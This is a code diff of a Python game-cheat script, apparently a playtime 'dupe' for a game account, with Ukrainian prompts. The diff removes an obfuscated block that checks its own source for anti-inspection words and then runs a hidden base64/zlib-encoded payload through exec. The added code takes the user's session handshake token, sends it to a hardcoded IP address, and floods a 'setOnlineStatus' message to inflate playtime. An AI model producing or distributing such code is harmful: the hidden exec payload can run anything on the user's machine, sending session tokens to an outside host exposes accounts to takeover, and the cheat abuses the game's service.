@@ -1,9 +1,27 @@
-#---------------------------
-# Obfuscated with VarumaObfuscation
-#---------------------------
+import os, socket
+os.system('cls||clear')
 
-def Varuma_Obfuscation                                                                                                                                                                                                                                                                                                                                                                                                                                               (_data: str) -> str:
-    key                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    = 'etkBXAChqbJbiSDJQCXqdRmHnOCHvFkw';IIlI=eval('chr(97)+chr(98)+chr(99)+chr(100)+chr(101)+chr(102)+chr(103)+chr(104)+chr(105)+chr(106)+chr(107)+chr(108)+chr(109)+chr(110)+chr(111)+chr(112)+chr(113)+chr(114)+chr(115)+chr(116)+chr(117)+chr(118)+chr(119)+chr(120)+chr(121)+chr(122)+chr(48)+chr(49)+chr(50)+chr(51)+chr(52)+chr(53)+chr(54)+chr(55)+chr(56)+chr(57)');exec(f'{IIlI[8]+IIlI[5]} "{IIlI[8]+IIlI[5]}" not in open(__file__).read():exit()')
-    if                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               IIlI[15]+IIlI[17]+IIlI[8]+IIlI[13]+IIlI[19] in open(__file__, errors=IIlI[8]+IIlI[6]+IIlI[13]+IIlI[14]+IIlI[17]+IIlI[4]).read() or IIlI[8]+IIlI[13]+IIlI[15]+IIlI[20]+IIlI[19] in open(__file__, errors=IIlI[8]+IIlI[6]+IIlI[13]+IIlI[14]+IIlI[17]+IIlI[4]).read() or IIlI[22]+IIlI[17]+IIlI[8]+IIlI[19]+IIlI[4] in open(__file__, errors=IIlI[8]+IIlI[6]+IIlI[13]+IIlI[14]+IIlI[17]+IIlI[4]).read():exit()
-    exec                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            (__import__(IIlI[25]+IIlI[11]+IIlI[8]+IIlI[1]).decompress(__import__(eval('chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)')).b64decode(_data)))
-Varuma_Obfuscation                                                                                                                                                                                                                                                                                                                                                                                                                (_data=b'eJyVVctu20YUXUdfMcmGJKCyJIcaWiq0cN0EaYokaJyFizQQZGkUE7JIh2TiGMjCluvYBQKnL3gRNJv2A6rGsiPZlv0LM7/QL+mZIf2IkSINAb7mnnvn3HOGw7BDunyFXK2Tazzrfjk3PbPweP7WfDj71a1vZ+Yet+/1bkZ3Z24+vdFdvlbjz8LMtEqlsEOMpSSMMoOEEYmXeGQ2Gp1wkTcaZcKTJE7SuhE+iuKEG5ad8GbbtEicEGM5CTP+qUlhtPTkk2cKOwaJ4uz/Z50311uKk4zEaTmNW12eleLUTlfSjPdMo7WYPn/eWuTNxLBKKlzPMXZ+M4u36RuNr+9cv18UsGfvznzTmL1/7/r07TzLbsVRxFuZaRrUDlzbqzj2lGeUPRyWVcriLo/qum3TEL+It2JPDOWO7MuXBC8DuUXEsdwUI/kjIhMxEmMiN/TjUG7hPhYHNaI7W1pstrhpEKNsFIztlEdtc34l46ndSeLeAn9m6gmtj8dj3S7Ktp6aruP5lt3mrbiNCZ5knc+mjPJlbdVKiR/Qh/W6YRo1vWRM48E/W68fEvGnXBMn6GoLtAfoS+6IIQZWxQA9HmDocktigIJ8MeVnheZQ5g2CyEXeh4UwrC8KZ4ss8Zc4gHDHRF3KRL5QOIKEbXECXZF7CArjnJXmI1/IbfkbXlRSH8EDwI7keh4eiQlqjPC8XtY1FXAPAfACbgibLhqnstGKXEdaH6PvTVlW9UfiiECbgTjSj4jtiV1lP3AoPlEl5Kpcl5s4QWs3n0X1b5PvI/Hr+ftl9LaiItfkq6KP03mUDmvA7YhD+RL0Rnlrx2IMGQ/VrGeTKMq6uYHGTrQUO0Ts6z53NIOfEdzHqfmeKGMJlutArhUyK+kmYo+IdxjcOBWpoHtJIi3JQEPBZAQ+ObTwTdNe1fL3L9il1dawdSJ/0BIfazuUbZr+PmhB4HLB5C1KDHVPr6DSpuIyBnxXdfCO6BWpPBpi7MAm4nfc9+FyX+VqqaBqX4PPeOYEzssoKybwcdOGRH8Uy2hfLysotwo+f+eKnbI9vNjHpWVN8mxlstwgbnDBIVX+J3wToCNXoRNcyhlc1EoMauS7ZreZNnsh8K+1W2Cu1C9SFSSze/zzlQLXwF6ATxDXuuHow285Tc+nLqXMp1OM0oBOUc9rM4/61KHMa1OfecylPp6qzGcsj7IKrSLiI+IwijeFoq7n0orDWswNqqwSeBXgWJt1Ap9VKlSNBIxVFd5tOp1Ajfh+h3FkVHEFBkg38INKQB3H85gXVD2nUmUum8c4xb3Nqp5nlN7fid6cfSP9fOPRa1VZkNuJ9VrstIOr6H95AX8S4tZKVz62X17p4FfUUP+gpBk94mbFqv1XCk7L+hecyMPl')
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(('3.71.250.82', 2222))
+
+token = input('Введіть ваш очищений хендшейк: ').replace(' ','')
+sock.send(bytes.fromhex(token))
+sock.send(bytes.fromhex(token))
+o = sock.recv(1024).decode("utf-8", errors="ignore")
+if o[3] == '(':
+    print('[√] Успішна відправка хендшейка')
+else:
+    print('[X] Невірний хендшейк')
+    exit()
+print('''Якщо що, цей дюп онлайна працює по такому принципу, що переводить ваш аккаунт в онлайн, тим самим легітно накручує години. 
+Години накручуються так само, скільки пройшло годин в реальномі житі. 
+Бажано під час дюпу не заходити на аккаунт, та залишити цей скрипт працювати у фоновому режіми, не видаляючи його з вкладок. Можете просто залишати його наніч.
+Також потрібно оновлювати хендшейк кожних 17 годин.
+Автор цього скрипта: Yakasami+Flocker
+Канал автора: t.me/yakasami_hex''')
+hex = '0000004c0a2431336438633738322d623430362d346261342d396466322d6265393464613063653462631213506c6179657252656d6f7465536572766963651a0f7365744f6e6c696e65537461747573002262792059616b6173616d6922'
+print('[√] Накрутка часов запущена!')
+while 1:
+    sock.send(bytes.fromhex(token))
+    for _ in range(5):
+        sock.send(bytes.fromhex(hex))
